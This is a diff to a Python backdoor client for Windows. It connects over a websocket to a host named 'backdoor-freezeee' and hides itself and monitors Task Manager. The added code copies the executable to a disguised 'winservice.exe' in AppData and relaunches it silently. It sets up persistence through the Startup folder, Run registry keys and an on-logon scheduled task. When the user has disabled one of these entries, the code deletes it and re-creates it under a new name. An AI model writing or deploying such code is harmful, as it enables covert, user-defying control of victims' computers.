@@ -14,45 +14,173 @@ server_url = "wss://backdoor-freezeee.onrender.com"
 
 CLIENT_NAME = socket.gethostname()
 
-if getattr(sys, 'frozen', False):
-    current_path = sys.executable
-else:
-    current_path = os.path.abspath(__file__)
+exe_path = sys.executable
 
-dir_path = os.path.dirname(current_path)
-filename = os.path.basename(current_path)
+roaming = os.environ["APPDATA"]
+target_dir = os.path.join(roaming, "Windows")
 
-name, ext = os.path.splitext(filename)
+if os.path.commonpath([exe_path, target_dir]) == target_dir:
+    sys.exit()
 
-new_name = name + "l" + ext
-new_path = os.path.join(dir_path, new_name)
+new_exe_name = "winservice.exe"
+target_exe = os.path.join(target_dir, new_exe_name)
 
-if not os.path.exists(new_path):
-    shutil.copy2(current_path, new_path)
+os.makedirs(target_dir, exist_ok=True)
 
-def will_startup_execute(filename):
-    filename = filename.lower()
+if not os.path.exists(target_exe):
+    shutil.copy2(exe_path, target_exe)
+    subprocess.run(
+        [target_exe],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL
+    )
 
-    approved_keys = [
-        (winreg.HKEY_CURRENT_USER,
-         r"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\StartupFolder"),
-        (winreg.HKEY_LOCAL_MACHINE,
-         r"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\StartupFolder")
-    ]
+def ensure_startup_persistence():
+    exe_name = os.path.splitext(os.path.basename(exe_path))[0]
+    base_name = exe_name
 
-    for root, path in approved_keys:
+    startup_folder = os.path.join(
+        os.environ["APPDATA"],
+        r"Microsoft\Windows\Start Menu\Programs\Startup"
+    )
+
+    run_key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+
+    # ==========================================================
+    # StartupApproved
+    # ==========================================================
+    def is_enabled(source, name):
+        path = rf"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\{source}"
         try:
-            with winreg.OpenKey(root, path) as key:
-                i = 0
-                while True:
-                    name, value, _ = winreg.EnumValue(key, i)
-                    if name.lower() == filename:
-                        return value[0] != 0x03
-                    i += 1
-        except (FileNotFoundError, OSError):
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, path) as key:
+                value, _, _ = winreg.QueryValueEx(key, name)
+                return value[0] == 0x02
+        except FileNotFoundError:
+            return True
+
+    # ==========================================================
+    # Nome incremental (IniciarPrograma, IniciarPrograma2, ...)
+    # ==========================================================
+    def next_incremental_name(existing):
+        i = 1
+        name = base_name
+        while name.lower() in existing:
+            i += 1
+            name = f"{base_name}{i}"
+        return name
+
+    # ==========================================================
+    # STARTUP FOLDER
+    # ==========================================================
+    existing_files = {f.lower() for f in os.listdir(startup_folder)}
+
+    startup_file = f"{base_name}.exe"
+
+    if startup_file.lower() in existing_files:
+        if not is_enabled("StartupFolder", startup_file):
+            try:
+                os.remove(os.path.join(startup_folder, startup_file))
+            except OSError:
+                pass
+            startup_file = f"{next_incremental_name(existing_files)}.exe"
+
+    if startup_file.lower() not in existing_files:
+        try:
+            shutil.copy2(exe_path, os.path.join(startup_folder, startup_file))
+        except OSError:
             pass
 
-    return True
+    # ==========================================================
+    # REGISTRY RUN (HKCU)
+    # ==========================================================
+    try:
+        with winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            run_key_path,
+            0,
+            winreg.KEY_ALL_ACCESS
+        ) as key:
+
+            existing_values = set()
+            i = 0
+            while True:
+                try:
+                    name, _, _ = winreg.EnumValue(key, i)
+                    existing_values.add(name.lower())
+                    i += 1
+                except OSError:
+                    break
+
+            reg_name = base_name
+
+            if reg_name.lower() in existing_values:
+                if not is_enabled("Run", reg_name):
+                    winreg.DeleteValue(key, reg_name)
+                    reg_name = next_incremental_name(existing_values)
+
+            if reg_name.lower() not in existing_values:
+                winreg.SetValueEx(
+                    key,
+                    reg_name,
+                    0,
+                    winreg.REG_SZ,
+                    f'"{exe_path}"'
+                )
+    except OSError:
+        pass
+
+    # ==========================================================
+    # SCHEDULED TASK (USER)
+    # ==========================================================
+    def task_exists(name):
+        return subprocess.run(
+            ["schtasks", "/query", "/tn", name],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        ).returncode == 0
+
+    def task_disabled(name):
+        r = subprocess.run(
+            ["schtasks", "/query", "/tn", name, "/fo", "LIST"],
+            capture_output=True,
+            text=True
+        )
+        return "Disabled" in r.stdout
+
+    def create_task(name):
+        subprocess.run(
+            [
+                "schtasks",
+                "/create",
+                "/tn", name,
+                "/tr", f'"{exe_path}"',
+                "/sc", "onlogon",
+                "/rl", "limited",
+                "/f"
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
+
+    task_name = base_name
+    i = 1
+
+    while task_exists(task_name):
+        if task_disabled(task_name):
+            subprocess.run(
+                ["schtasks", "/delete", "/tn", task_name, "/f"],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
+            )
+            break
+        i += 1
+        task_name = f"{base_name}{i}"
+
+    if not task_exists(task_name):
+        create_task(task_name)
+
+def ensure_persistence():
+    threading.Timer(5, ensure_startup_persistence).start()
 
 async def pinger(ws):
     try:
@@ -84,7 +212,7 @@ state = {
 if not im_in_startup():
     hide_file(sys.executable)
     sleep(3)
-    move_to_startup(sys.executable)
+ensure_persistence()
 monitor_taskmgr()
 check_reinstall()
 
